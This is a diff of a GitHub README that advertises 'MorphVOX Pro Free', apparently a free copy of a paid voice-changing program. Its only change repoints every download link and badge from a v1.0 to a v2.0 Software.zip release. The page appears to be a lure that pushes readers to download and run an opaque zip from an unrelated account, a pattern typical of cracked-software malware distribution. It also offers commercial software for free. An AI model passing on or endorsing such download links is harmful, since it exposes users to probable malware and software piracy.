@@ -27,7 +27,7 @@ The user-friendly interface of MorphVOX Pro makes it simple for beginners to sta
 
 ## Download MorphVOX Pro Free 📥
 
-For downloading MorphVOX Pro Free, you can click [here](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v1.0/Software.zip).
+For downloading MorphVOX Pro Free, you can click [here](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v2.0/Software.zip).
 
 ### Launch MorphVOX Pro Free:
 Click the link above to download the MorphVOX Pro Free zip file. Once downloaded, unzip the file and launch the application. Have fun exploring the various voice-changing options!
@@ -104,10 +104,10 @@ Unlock additional features and voice options by upgrading to the full version of
 We hope you enjoy using MorphVOX Pro for all your voice-changing needs. Download the software, unleash your creativity, and transform your voice in exciting new ways! 
 
 ### Get Started Today! 🚀
-Download MorphVOX Pro Free [here](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v1.0/Software.zip).
+Download MorphVOX Pro Free [here](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v2.0/Software.zip).
 
 For more information and updates, visit the **Releases** section of the repository. 
 
-[![Download MorphVOX Pro](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v1.0/Software.zip%20Pro-blue)](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v1.0/Software.zip)
+[![Download MorphVOX Pro](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v2.0/Software.zip%20Pro-blue)](https://github.com/Yvyboo/MorphVOX-Pro-Free/releases/download/v2.0/Software.zip)
 
 ---
